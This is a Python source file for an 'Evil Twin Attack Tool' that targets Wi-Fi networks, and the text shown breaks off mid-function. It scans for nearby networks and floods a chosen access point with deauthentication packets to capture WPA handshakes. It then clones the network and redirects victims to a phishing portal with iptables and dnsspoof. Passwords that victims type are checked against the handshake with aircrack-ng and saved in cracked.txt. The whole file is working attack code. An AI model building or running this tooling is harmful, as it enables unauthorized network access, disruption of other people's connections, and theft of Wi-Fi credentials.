#!/usr/bin/env python3
"""
Evil Twin Attack Tool - Python Version
Complete rewrite with all fixes:
- Auto-detects internet interface
- Cleans old capture files on Ctrl+C and script end
- Fixed AP selection prompts
- Proper handshake detection
- Fixed virtual AP creation
- Added support for physical interfaces as AP source
"""

import subprocess
import re
import os
import sys
import time
import signal
import threading
import json
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
import logging
import atexit

# Setup logging with DEBUG level
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/tmp/evil_twin_debug.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Color codes for terminal output
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    NC = '\033[0m'

def log_info(msg): logger.info(f"{Colors.GREEN}[*]{Colors.NC} {msg}")
def log_warn(msg): logger.warning(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")
def log_error(msg): logger.error(f"{Colors.RED}[-]{Colors.NC} {msg}")
def log_success(msg): logger.info(f"{Colors.GREEN}[✓]{Colors.NC} {msg}")
def log_debug(msg): logger.debug(f"{Colors.BLUE}[DEBUG]{Colors.NC} {msg}")

@dataclass
class AttackConfig:
    """Configuration storage for the attack"""
    target_bssid: str = ""
    target_ssid: str = ""
    target_channel: str = ""
    fake_ssid: str = ""
    handshake_file: str = ""
    mon_interface: str = ""
    ap_interface: str = ""
    ap_base: str = ""
    internet_interface: str = ""
    selected_interface: str = ""
    
    # Process IDs for cleanup
    deauth_pid: Optional[int] = None
    airodump_pid: Optional[int] = None
    client_check_process: Optional[subprocess.Popen] = None
    
    # Flags
    handshake_captured: bool = False
    monitor_mode_already: bool = False

class EvilTwinAttack:
    def __init__(self):
        self.config = AttackConfig()
        self.running = True
        self.setup_signal_handlers()
        atexit.register(self.cleanup_temp_files)
        
    def setup_signal_handlers(self):
        """Setup cleanup on Ctrl+C"""
        def cleanup_handler(signum, frame):
            log_info("Shutting down attack...")
            self.running = False
            self.cleanup()
            sys.exit(0)
            
        signal.signal(signal.SIGINT, cleanup_handler)
        signal.signal(signal.SIGTERM, cleanup_handler)
    
    def cleanup_temp_files(self):
        """Clean up temporary files on exit"""
        log_debug("Cleaning up temporary files...")
        
        # Clean /tmp files
        tmp_dir = Path('/tmp')
        patterns = ['client_check*', 'scan*', 'handshake_check*', 'airodump.log', 'deauth.log', 
                   'hostapd.log', 'dnsmasq.log', 'evil_twin_debug.log']
        for pattern in patterns:
            for f in tmp_dir.glob(pattern):
                try:
                    f.unlink()
                    log_debug(f"Removed: {f}")
                except:
                    pass
        
        # Clean local evil files
        for pattern in ['evil-*.cap', 'evil-*.csv', 'evil-*.kismet.*', 'evil-*.netxml', 
                       '*.pcap', 'attempts.txt', 'password.txt', '*.pid', 'client_check*']:
            for f in Path('.').glob(pattern):
                try:
                    f.unlink()
                    log_debug(f"Removed: {f}")
                except:
                    pass
    
    def run_command(self, cmd: str, check: bool = False, timeout: int = None) -> Tuple[int, str, str]:
        """Run a shell command with error handling"""
        log_debug(f"Running command: {cmd[:100]}...")
        try:
            if timeout:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            else:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
            if check and result.returncode != 0:
                log_error(f"Command failed: {cmd}")
                log_error(f"Error: {result.stderr}")
                
            log_debug(f"Command return code: {result.returncode}")
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            log_error(f"Command timed out: {cmd}")
            return -1, "", "Timeout"
        except Exception as e:
            log_error(f"Exception running command: {e}")
            return -1, "", str(e)
    
    def check_dependencies(self) -> bool:
        """Check if all required tools are installed"""
        required_tools = [
            'aircrack-ng', 'hostapd', 'dnsmasq', 'dnsspoof', 
            'python3', 'php', 'iw', 'airmon-ng', 'ethtool'
        ]
        
        missing = []
        for tool in required_tools:
            ret, _, _ = self.run_command(f"command -v {tool}")
            if ret != 0:
                missing.append(tool)
                log_error(f"Missing: {tool}")
            else:
                log_info(f"✓ {tool}")
        
        # Check Flask for Python
        ret, _, _ = self.run_command("python3 -c 'import flask'")
        if ret != 0:
            missing.append("flask (Python module)")
            log_error("Missing Flask module")
        
        if missing:
            log_error(f"Missing dependencies: {', '.join(missing)}")
            return False
        
        log_success("All dependencies are installed!")
        return True
    
    def is_interface_monitor_mode(self, interface: str) -> bool:
        """Check if interface is already in monitor mode"""
        ret, stdout, _ = self.run_command(f"iw dev {interface} info 2>/dev/null | grep -q 'type monitor'")
        if ret == 0:
            log_debug(f"Interface {interface} is already in monitor mode")
            return True
        return False
    
    def detect_device(self, hostname: str, mac: str) -> str:
        """Detect device type from hostname"""
        if hostname and hostname != "*":
            hostname_lower = hostname.lower()
            
            windows_patterns = ['desktop-', 'win-', 'pc-', 'windows', 'laptop', 'notebook']
            for pattern in windows_patterns:
                if pattern in hostname_lower:
                    return "Windows"
            
            apple_patterns = ['iphone', 'ipad', 'ipod', 'macbook', 'mac-']
            for pattern in apple_patterns:
                if pattern in hostname_lower:
                    return "Apple"
            
            android_patterns = ['android', 'galaxy', 'sm-']
            for pattern in android_patterns:
                if pattern in hostname_lower:
                    return "Android"
            
            linux_patterns = ['linux', 'ubuntu', 'kali', 'raspberry']
            for pattern in linux_patterns:
                if pattern in hostname_lower:
                    return "Linux"
        
        return "Unknown"
    
    def get_monitor_interface(self) -> str:
        """Detect existing monitor interface"""
        ret, stdout, _ = self.run_command("iw dev 2>/dev/null | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' | head -1")
        mon_iface = stdout.strip()
        if mon_iface:
            log_debug(f"Found monitor interface: {mon_iface}")
            return mon_iface
        
        for suffix in ['mon', '_mon', '']:
            check_iface = f"{self.config.selected_interface}{suffix}"
            ret, stdout, _ = self.run_command(f"iw dev 2>/dev/null | grep -q 'Interface {check_iface}'")
            if ret == 0:
                log_debug(f"Found monitor interface with suffix: {check_iface}")
                return check_iface
        
        ret, stdout, _ = self.run_command(f"iw dev {self.config.selected_interface} info 2>/dev/null | grep -q 'type monitor'")
        if ret == 0:
            log_debug(f"Selected interface is already monitor: {self.config.selected_interface}")
            return self.config.selected_interface
        
        return ""
    
    def enable_icnss_monitor(self, interface: str) -> Optional[str]:
        """Special monitor mode for ICNSS drivers"""
        con_mode_path = "/sys/module/wlan/parameters/con_mode"
        
        if not os.path.exists(con_mode_path):
            log_error(f"ICNSS con_mode file not found at {con_mode_path}")
            return None
        
        self.run_command(f"ip link set {interface} down")
        
        try:
            with open(con_mode_path, 'w') as f:
                f.write("4")
            log_debug(f"Set con_mode to 4 for {interface}")
        except Exception as e:
            log_error(f"Failed to set con_mode to 4: {e}")
            self.run_command(f"ip link set {interface} up")
            return None
        
        self.run_command(f"ip link set {interface} up")
        time.sleep(2)
        
        ret, _, _ = self.run_command(f"iw dev {interface} info | grep -q 'type monitor'")
        if ret == 0:
            log_success(f"ICNSS monitor mode enabled on {interface}")
            return interface
        
        log_error("Failed to verify monitor mode on ICNSS interface")
        return None
    
    def get_internet_interface(self) -> str:
        """Auto-detect the active internet interface"""
        ret, stdout, _ = self.run_command("ip route get 8.8.8.8 2>/dev/null | awk '{print $5}'")
        iface = stdout.strip()
        if iface:
            log_success(f"Auto-detected internet interface: {iface}")
            return iface
        return ""
    
    def select_adapter(self) -> bool:
        """Select wireless adapter with auto-detection"""
        # Temporarily disable debug logging to keep menu clean
        old_level = logger.level
        logger.setLevel(logging.INFO)
        
        log_info("Scanning for wireless adapters...")
        
        ret, stdout, _ = self.run_command("iw dev 2>/dev/null | grep Interface | awk '{print $2}'")
        interfaces = stdout.strip().split('\n')
        interfaces = [i for i in interfaces if i]
        
        log_debug(f"Found interfaces: {interfaces}")
        
        if not interfaces:
            log_error("No wireless interfaces found")
            logger.setLevel(old_level)
            return False
        
        # Auto-select if only one physical adapter
        physical_count = 0
        for iface in interfaces:
            if os.path.exists(f"/sys/class/net/{iface}/device"):
                physical_count += 1
        
        if physical_count == 1:
            for iface in interfaces:
                if os.path.exists(f"/sys/class/net/{iface}/device"):
                    self.config.selected_interface = iface
                    log_info(f"Auto-selected: {self.config.selected_interface}")
                    logger.setLevel(old_level)
                    return True
        
        # Display adapters
        print("\nInterface     PHY    Driver       Device")
        print("========================================================")
        
        adapter_map = {}
        counter = 1
        
        for iface in interfaces:
            ret, phy, _ = self.run_command(f"iw dev {iface} info 2>/dev/null | grep wiphy | awk '{{print \"phy\"$2}}'")
            phy = phy.strip()
            
            ret, driver, _ = self.run_command(f"ethtool -i {iface} 2>/dev/null | grep driver: | cut -d: -f2 | sed 's/^[[:space:]]*//'")
            driver = driver.strip()
            if not driver and os.path.exists(f"/sys/class/net/{iface}/device/driver"):
                driver = os.path.basename(os.readlink(f"/sys/class/net/{iface}/device/driver"))
            
            chipset = "Unknown"
            if os.path.exists(f"/sys/class/net/{iface}/device"):
                device_path = os.path.realpath(f"/sys/class/net/{iface}/device")
                if 'usb' in device_path:
                    ret, chipset, _ = self.run_command("lsusb | grep -i 'wireless\\|network\\|wlan' | head -1 | sed 's/^.*ID [0-9a-f:]\\+ //'")
                    chipset = chipset.strip()
                elif 'pci' in device_path:
                    ret, chipset, _ = self.run_command(f"lspci | grep -i network | head -1 | sed 's/^[0-9a-f:]\\+ //'")
                    chipset = chipset.strip()
            
            display_iface = iface[:9] + "~" if len(iface) > 10 else iface
            display_chipset = chipset[:24] + "~" if len(chipset) > 25 else chipset
            
            adapter_map[counter] = iface
            print(f" {Colors.GREEN}{counter:2d}.{Colors.NC} {display_iface:<11} {phy:<6} {driver:<12} {display_chipset}")
            counter += 1
        
        print("========================================================")
        
        while True:
            try:
                selection = int(input(f"Select interface (1-{counter-1}): "))
                if 1 <= selection <= counter-1:
                    self.config.selected_interface = adapter_map[selection]
                    log_info(f"Selected: {self.config.selected_interface}")
                    break
                else:
                    log_error("Invalid selection")
            except ValueError:
                log_error("Invalid input")
        
        # Restore debug logging
        logger.setLevel(old_level)
        return True
    
    def check_for_clients(self, bssid: str, channel: str, timeout: int = 15) -> int:
        """Check if target network has any clients"""
        log_info(f"Checking for clients on {bssid} (channel {channel}) for {timeout} seconds...")
        
        print(f"\n{Colors.YELLOW}[!]{Colors.NC} Listening for clients on {channel}...")
        print(f"{Colors.YELLOW}[!]{Colors.NC} Will check for {timeout} seconds")
        
        # Clean old files
        for f in Path('/tmp').glob('client_check*'):
            f.unlink()
        for f in Path('.').glob('client_check*'):
            f.unlink()
        
        # Start airodump-ng in background
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w /tmp/client_check {self.config.mon_interface}"
        
        self.config.client_check_process = subprocess.Popen(
            cmd, shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        log_debug(f"Started airodump for client check, PID: {self.config.client_check_process.pid}")
        
        # Countdown with visual feedback
        for i in range(timeout):
            print(f"\rListening for clients... {timeout - i} seconds remaining", end='', flush=True)
            time.sleep(1)
        
        print()
        
        # Kill airodump
        if self.config.client_check_process:
            self.config.client_check_process.terminate()
            time.sleep(2)
            self.config.client_check_process = None
        
        # Parse results
        client_count = 0
        clients = []
        csv_file = Path("/tmp/client_check-01.csv")
        
        if csv_file.exists():
            log_debug(f"Client check file exists, size: {csv_file.stat().st_size} bytes")
            with open(csv_file, 'r') as f:
                in_station_section = False
                for line in f:
                    if "Station MAC" in line:
                        in_station_section = True
                        continue
                    if in_station_section and line.strip() and not line.startswith("BSSID"):
                        parts = line.split(',')
                        if parts and parts[0].strip():
                            mac = parts[0].strip()
                            if mac and len(mac) == 17:
                                clients.append(mac)
                                client_count += 1
        else:
            log_warn("Client check file not created")
        
        # Display results
        if client_count > 0:
            log_success(f"Found {client_count} client(s):")
            for mac in clients[:5]:
                print(f"  {mac}")
            if client_count > 5:
                print(f"  ... and {client_count - 5} more")
        else:
            log_warn(f"No clients found on {bssid}")
        
        # Clean up client check files
        for f in Path('/tmp').glob('client_check*'):
            f.unlink()
        for f in Path('.').glob('client_check*'):
            f.unlink()
        
        return client_count
    
    def scan_networks(self) -> bool:
        """Scan for nearby WiFi networks"""
        log_info("Scanning for networks...")
        
        if not self.config.selected_interface:
            log_error("No interface selected!")
            return False
        
        log_info(f"Setting up monitor mode on {self.config.selected_interface}...")
        
        # Check if already in monitor mode
        if self.is_interface_monitor_mode(self.config.selected_interface):
            log_success(f"Interface {self.config.selected_interface} is already in monitor mode")
            self.config.mon_interface = self.config.selected_interface
            self.config.monitor_mode_already = True
        else:
            ret, driver, _ = self.run_command(f"ethtool -i {self.config.selected_interface} 2>/dev/null | grep driver: | cut -d: -f2 | sed 's/^[[:space:]]*//'")
            driver = driver.strip()
            log_debug(f"Driver: {driver}")
            
            if driver in ['icnss', 'icnss2']:
                log_info("ICNSS driver detected, using special method...")
                mon_iface = self.enable_icnss_monitor(self.config.selected_interface)
                if not mon_iface:
                    log_error("Failed to enable ICNSS monitor mode!")
                    return False
                self.config.mon_interface = mon_iface
            else:
                self.run_command(f"ifconfig {self.config.selected_interface} down")
                self.run_command(f"iw dev {self.config.selected_interface} set type monitor")
                self.run_command(f"ifconfig {self.config.selected_interface} up")
                time.sleep(2)
                
                self.config.mon_interface = self.get_monitor_interface()
                if not self.config.mon_interface:
                    log_error("Failed to detect monitor interface!")
                    return False
                
                ret, _, _ = self.run_command(f"iw dev {self.config.mon_interface} info | grep -q 'type monitor'")
                if ret != 0:
                    log_error(f"{self.config.mon_interface} is not in monitor mode!")
                    return False
            
            log_success(f"Monitor mode enabled on: {self.config.mon_interface}")
        
        log_info("Scanning for 20 seconds...")
        self.run_command(f"timeout --signal=KILL 20 airodump-ng {self.config.mon_interface} --output-format csv -w /tmp/scan > /dev/null 2>&1")
        
        if not Path("/tmp/scan-01.csv").exists():
            log_error("No networks found")
            return False
        
        networks = {}
        counter = 1
        
        print("\nAvailable networks:")
        print("----------------------------------------")
        
        with open("/tmp/scan-01.csv", 'r') as f:
            in_ap_section = True
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("Station MAC"):
                    in_ap_section = False
                    continue
                if in_ap_section and not line.startswith("BSSID"):
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip()
                        
                        if re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', bssid) and essid:
                            networks[counter] = (bssid, channel, essid)
                            print(f" {Colors.GREEN}{counter:2d}.{Colors.NC} {essid:<25} [Ch {channel}]")
                            counter += 1
        
        print("----------------------------------------")
        
        if counter == 1:
            log_error("No networks detected")
            return False
        
        while True:
            try:
                selection = int(input(f"Select target (1-{counter-1}): "))
                if 1 <= selection <= counter-1:
                    bssid, channel, essid = networks[selection]
                    self.config.target_bssid = bssid
                    self.config.target_channel = channel
                    self.config.target_ssid = essid
                    self.config.fake_ssid = essid
                    break
                else:
                    log_error("Invalid selection")
            except ValueError:
                log_error("Invalid input")
        
        log_success(f"Target: {self.config.target_ssid} ({self.config.target_bssid[:8]}...) on channel {self.config.target_channel}")
        return True
    
    def capture_handshake(self) -> bool:
        """Capture WPA handshake using deauth attack"""
        
        # Clean old capture files before starting
        log_debug("Cleaning old capture files...")
        for pattern in ['evil-*.cap', 'evil-*.csv', 'evil-*.kismet.*', 'evil-*.netxml']:
            for f in Path('.').glob(pattern):
                f.unlink()
                log_debug(f"Removed: {f}")
        for f in Path('/tmp').glob('handshake_check*'):
            f.unlink()
        
        log_info(f"Capturing handshake for {self.config.target_ssid} on channel {self.config.target_channel}...")
        
        # Check for clients first
        client_count = self.check_for_clients(self.config.target_bssid, self.config.target_channel)
        
        if client_count == 0:
            log_warn(f"No clients detected on {self.config.target_ssid}")
            response = input("\nNo clients found. Continue with evil twin anyway? (y/n): ")
            if response.lower() != 'y':
                return False
        
        # Set channel
        self.run_command(f"iw dev {self.config.mon_interface} set channel {self.config.target_channel}")
        log_debug(f"Set channel to {self.config.target_channel}")
        time.sleep(2)
        
        # Start airodump-ng
        log_debug("Starting airodump-ng...")
        with open('/tmp/airodump.log', 'w') as f:
            self.config.airodump_pid = subprocess.Popen(
                f"nohup airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w evil {self.config.mon_interface} > /tmp/airodump.log 2>&1 &",
                shell=True,
                stdin=subprocess.DEVNULL
            ).pid
        
        log_debug(f"Airodump PID: {self.config.airodump_pid}")
        time.sleep(3)
        
        # Start aireplay-ng deauth
        log_debug("Starting aireplay-ng deauth...")
        with open('/tmp/deauth.log', 'w') as f:
            self.config.deauth_pid = subprocess.Popen(
                f"nohup aireplay-ng -0 0 -a {self.config.target_bssid} {self.config.mon_interface} > /tmp/deauth.log 2>&1 &",
                shell=True,
                stdin=subprocess.DEVNULL
            ).pid
        
        log_debug(f"Deauth PID: {self.config.deauth_pid}")
        
        log_info("Deauth running - waiting for handshake (max 60 seconds)...")
        
        handshake_captured = False
        
        # Wait and check for handshake
        for i in range(60):
            capture_files = list(Path('.').glob('evil-*.cap'))
            if capture_files:
                capture_file = capture_files[0]
                log_debug(f"Found capture file: {capture_file}")
                
                # Copy to tmp like Bash script
                self.run_command(f"cp {capture_file} /tmp/handshake_check.cap")
                
                # Check for handshake
                ret, stdout, _ = self.run_command("aircrack-ng /tmp/handshake_check.cap 2>/dev/null | grep -q '1 handshake'")
                if ret == 0:
                    log_success(f"Handshake captured at {i} seconds!")
                    handshake_captured = True
                    break
                
                # Also check for EAPOL packets
                ret2, eapol_out, _ = self.run_command("tshark -r /tmp/handshake_check.cap -Y eapol 2>/dev/null | wc -l")
                if ret2 == 0 and eapol_out.strip():
                    eapol_count = int(eapol_out.strip())
                    if eapol_count >= 4:
                        log_success(f"Found {eapol_count} EAPOL packets - handshake captured!")
                        handshake_captured = True
                        break
            
            if i % 5 == 0:
                print(f"\rWaiting for handshake... {i} seconds elapsed", end='', flush=True)
            time.sleep(1)
        
        print()
        
        # Kill processes
        log_debug("Killing processes...")
        if self.config.airodump_pid:
            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
        if self.config.deauth_pid:
            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
        time.sleep(2)
        
        if handshake_captured:
            safe_ssid = re.sub(r'[^a-zA-Z0-9]', '_', self.config.target_ssid)
            self.config.handshake_file = f"{safe_ssid}.cap"
            
            capture_files = list(Path('.').glob('evil-*.cap'))
            if capture_files:
                self.run_command(f"cp {capture_files[0]} {self.config.handshake_file}")
                log_success(f"Handshake saved as: {self.config.handshake_file}")
                self.config.handshake_captured = True
            
            # Clean up evil files after saving
            for f in Path('.').glob('evil-*.cap'):
                f.unlink()
            return True
        else:
            log_warn("No handshake captured after 60 seconds")
            response = input("Continue with evil twin attack anyway? (y/n): ")
            if response.lower() != 'y':
                return False
            return True
    
    def select_interfaces(self) -> bool:
        """Select AP and internet interfaces"""
        print("\n----------------------------------------")
        print("AP Interface Selection:")
        print(" 1. Create virtual AP from wlan0 (built-in)")
        print(" 2. Use existing external adapter directly")
        print(" 3. Custom interface name")
        print("----------------------------------------")
        
        ap_source = input("Select AP source [1-3]: ")
        
        if ap_source == "1":
            self.config.ap_base = "wlan0"
            self.config.ap_interface = input("Enter name for virtual AP interface (e.g., wlan2, wlan3, ap0): ")
            log_info(f"Will create virtual AP from {self.config.ap_base} as {self.config.ap_interface}")
        elif ap_source == "2":
            ret, stdout, _ = self.run_command("ip link show | grep -E '^[0-9]+: (wlan|eth|rmnet|bat|usb)' | cut -d: -f2 | sed 's/ //g'")
            print("Available interfaces:", stdout)
            self.config.ap_interface = input("Enter interface name to use for AP: ")
            self.config.ap_base = self.config.ap_interface
            log_info(f"Using {self.config.ap_interface} directly for AP")
        else:
            self.config.ap_interface = input("Enter custom AP interface name: ")
            self.config.ap_base = self.config.ap_interface
        
        # Auto-detect internet interface
        print("\n----------------------------------------")
        print("Internet Source:")
        print(" 1. WiFi (wlan0)")
        print(" 2. Cellular (auto-detect)")
        print(" 3. Custom interface")
        print("----------------------------------------")
        
        internet_choice = input("Select internet source [1-3]: ")
        
        if internet_choice == "1":
            self.config.internet_interface = "wlan0"
        elif internet_choice == "2":
            # Auto-detect cellular interface
            detected = self.get_internet_interface()
            if detected:
                self.config.internet_interface = detected
            else:
                log_warn("Could not auto-detect, using rmnet_data0 as fallback")
                self.config.internet_interface = "rmnet_data0"
        else:
            custom = input("Enter custom internet interface: ")
            self.config.internet_interface = custom or "wlan0"
        
        log_success(f"AP Interface: {self.config.ap_interface}")
        log_success(f"Internet Interface: {self.config.internet_interface}")
        return True
    
    def update_configs(self):
        """Update configuration files with selected values"""
        log_info("Configuring attack...")
        
        if Path("passapi.py").exists():
            self.run_command(f"sed -i 's/target = .*/target = \"{self.config.target_bssid}\"/' passapi.py")
            self.run_command(f"sed -i 's/ssid_name = .*/ssid_name = \"{self.config.target_ssid}\"/' passapi.py")
            self.run_command(f"sed -i 's/handshake_file = .*/handshake_file = \"{self.config.handshake_file}\"/' passapi.py")
            log_debug("Updated passapi.py")
        else:
            log_error("passapi.py not found!")
            sys.exit(1)
        
        if Path("hostapd.conf").exists():
            self.run_command(f"sed -i 's/^ssid=.*/ssid={self.config.target_ssid}/' hostapd.conf")
            self.run_command(f"sed -i 's/^channel=.*/channel={self.config.target_channel}/' hostapd.conf")
            self.run_command(f"sed -i 's/^interface=.*/interface={self.config.ap_interface}/' hostapd.conf")
            log_debug("Updated hostapd.conf")
        else:
            log_error("hostapd.conf not found!")
            sys.exit(1)
        
        if Path("dnsmasq.conf").exists():
            self.run_command(f"sed -i 's/^interface=.*/interface={self.config.ap_interface}/' dnsmasq.conf")
            log_debug("Updated dnsmasq.conf")
        else:
            log_error("dnsmasq.conf not found!")
            sys.exit(1)
    
    def setup_internet_sharing(self) -> bool:
        """Setup internet sharing with iptables - FIXED virtual AP creation"""
        log_info("Setting up internet sharing...")
        
        # Auto-detect routing table
        ret, stdout, _ = self.run_command("ip route get 8.8.8.8 2>/dev/null | grep -oP 'table \\K\\d+'")
        table = stdout.strip()
        
        if not table:
            log_warn("Could not detect routing table, using main")
            table = "main"
        
        log_debug(f"Routing table: {table}")
        
        # ========== FIXED: AP INTERFACE LOGIC ==========
        log_debug(f"AP Base: {self.config.ap_base}, AP Interface: {self.config.ap_interface}")
        
        # Check if this is a virtual interface (base differs from interface)
        if self.config.ap_base != self.config.ap_interface:
            # Virtual interface - create from wlan0
            log_info(f"Creating virtual AP interface {self.config.ap_interface} from {self.config.ap_base}...")
            
            # Remove if it already exists
            self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
            time.sleep(1)
            
            # Create virtual AP
            ret, _, _ = self.run_command(f"iw dev {self.config.ap_base} interface add {self.config.ap_interface} type __ap")
            if ret != 0:
                log_error(f"Failed to create virtual interface {self.config.ap_interface}")
                return False
            
            # Configure and bring up
            self.run_command(f"ip addr flush {self.config.ap_interface}")
            self.run_command(f"ip link set up dev {self.config.ap_interface}")
            time.sleep(2)
            
            # Verify it's UP
            ret, _, _ = self.run_command(f"ip link show {self.config.ap_interface} | grep -q 'state UP'")
            if ret != 0:
                log_error(f"Virtual AP interface {self.config.ap_interface} failed to come UP!")
                return False
            log_success(f"Virtual AP interface {self.config.ap_interface} is UP")
            
        else:
            # Physical interface - use it directly
            log_info(f"Using existing interface {self.config.ap_interface} directly for AP")
            
            # Check if interface exists
            ret, _, _ = self.run_command(f"ip link show {self.config.ap_interface}")
            if ret != 0:
                log_error(f"Interface {self.config.ap_interface} does not exist!")
                return False
            
            # Set to AP mode
            self.run_command(f"ip link set {self.config.ap_interface} down")
            self.run_command(f"iw dev {self.config.ap_interface} set type __ap")
            self.run_command(f"ip link set {self.config.ap_interface} up")
            time.sleep(2)
            
            # Verify it's UP
            ret, _, _ = self.run_command(f"ip link show {self.config.ap_interface} | grep -q 'state UP'")
            if ret != 0:
                log_error(f"AP interface {self.config.ap_interface} failed to come UP!")
                return False
            log_success(f"AP interface {self.config.ap_interface} is UP")
        
        # ========== IPTABLES ==========
        log_info("Adding iptables for internet sharing...")
        self.run_command("iptables --flush")
        
        self.run_command(f"ifconfig {self.config.ap_interface} up 10.0.0.1 netmask 255.255.255.0")
        
        self.run_command(f"iptables -t nat -A PREROUTING -i {self.config.ap_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
        self.run_command(f"iptables --table nat --append POSTROUTING --out-interface {self.config.internet_interface} -j MASQUERADE")
        self.run_command(f"iptables --append FORWARD --in-interface {self.config.ap_interface} -j ACCEPT")
        
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write("1")
        
        self.run_command("ip rule add from all lookup main pref 1 2>/dev/null")
        self.run_command(f"ip rule add from all iif lo oif {self.config.ap_interface} uidrange 0-0 lookup 97 pref 11000 2>/dev/null")
        self.run_command(f"ip rule add from all iif lo oif {self.config.internet_interface} lookup {table} pref 17000 2>/dev/null")
        self.run_command(f"ip rule add from all iif lo oif {self.config.ap_interface} lookup 97 pref 17000 2>/dev/null")
        self.run_command(f"ip rule add from all iif {self.config.ap_interface} lookup {table} pref 21000 2>/dev/null")
        
        log_info("Starting services...")
        
        # Hostapd - FIXED: use subprocess.Popen
        subprocess.Popen(
            "sleep 5 && hostapd hostapd.conf 2>&1 | tee /tmp/hostapd.log > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(8)
        
        # Verify hostapd is running
        ret, _, _ = self.run_command("pgrep -f hostapd")
        if ret == 0:
          log_success("hostapd is running")
        else:
          log_error("hostapd failed to start")
        
        # Dnsmasq - FIXED: use subprocess.Popen
        subprocess.Popen(
            "dnsmasq -C dnsmasq.conf --log-dhcp -d > /tmp/dnsmasq.log 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        
        # Verify hostapd is running
        ret, _, _ = self.run_command("pgrep -f dnsmasq")
        if ret == 0:
          log_success("dnsmasq is running")
        else:
          log_error("dnsmasq failed to start")
          
        # Dnsspoof - FIXED: use subprocess.Popen
        subprocess.Popen(
            f"dnsspoof -i {self.config.ap_interface} > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        return True
    
    def start_evil_twin(self) -> bool:
        """Start the evil twin attack"""
        log_info("Starting evil twin...")
        
        if not self.setup_internet_sharing():
            return False
        
        time.sleep(8)
        
        # Passapi.py - FIXED: use subprocess.Popen
        subprocess.Popen(
            "python3 passapi.py > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(3)
        
        # PHP portal - FIXED: use subprocess.Popen
        subprocess.Popen(
            "cd portal && php -S 10.0.0.1:80 router.php > /dev/null 2>&1",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(8)
        log_success("Evil twin is live")
        return True
    
    def monitor_attack(self):
        """Monitor the attack in real-time"""
        log_info("Continuous deauth maintained from capture phase")
        
        print("\n===============================")
        print("ATTACK RUNNING")
        print("===============================")
        print(f"Target:    {self.config.target_ssid}")
        print(f"Evil Twin: {self.config.fake_ssid}")
        print(f"Channel:   {self.config.target_channel}")
        print(f"AP Interface: {self.config.ap_interface}")
        print(f"Internet:  {self.config.internet_interface}")
        print(f"Handshake: {self.config.handshake_file}")
        print(f"Deauth:    {self.config.mon_interface}")
        print("----------------------------------------")
        print("Monitoring connections & credentials...")
        print("----------------------------------------\n")
        
        shown_connections = set()
        connection_cache = set()
        
        hostapd_pos = 0
        dnsmasq_pos = 0
        
        while self.running:
            if Path("password.txt").exists():
                with open("password.txt", 'r') as f:
                    passwords = f.readlines()
                
                for password in passwords:
                    password = password.strip()
                    if password and password not in shown_connections:
                        shown_connections.add(password)
                        print(f"\n{Colors.YELLOW}[!]{Colors.NC} New password attempt: {password}")
                        
                        if self.config.handshake_captured and Path(self.config.handshake_file).exists():
                            ret, stdout, _ = self.run_command(f"aircrack-ng {self.config.handshake_file} -b {self.config.target_bssid} -w password.txt 2>/dev/null | grep -q 'KEY FOUND'")
                            if ret == 0:
                                print(f"\n{Colors.GREEN}PASSWORD CRACKED: {password}{Colors.NC}")
                                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                with open("cracked.txt", 'a') as f:
                                    f.write(f"{timestamp} | SSID: {self.config.target_ssid} | BSSID: {self.config.target_bssid} | Password: {password}\n")
                                print(f"{Colors.GREEN}Cracked Network Saved in: cracked.txt{Colors.NC}")
                                self.running = False
                                break
            
            if Path("/tmp/hostapd.log").exists():
                with open("/tmp/hostapd.log", 'r') as f:
                    f.seek(hostapd_pos)
                    for line in f:
                        if "AP-STA-CONNECTED" in line:
                            mac_match = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                            if mac_match:
                                mac = mac_match.group()
                                if mac not in connection_cache:
                                    connection_cache.add(mac)
                                    print(f"{Colors.GREEN}[+]{Colors.NC} Device connected: {mac}")
                        elif "AP-STA-DISCONNECTED" in line:
                            mac_match = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                            if mac_match:
                                mac = mac_match.group()
                                if mac in connection_cache:
                                    connection_cache.remove(mac)
                                print(f"{Colors.RED}[-]{Colors.NC} Device disconnected: {mac}")
                    
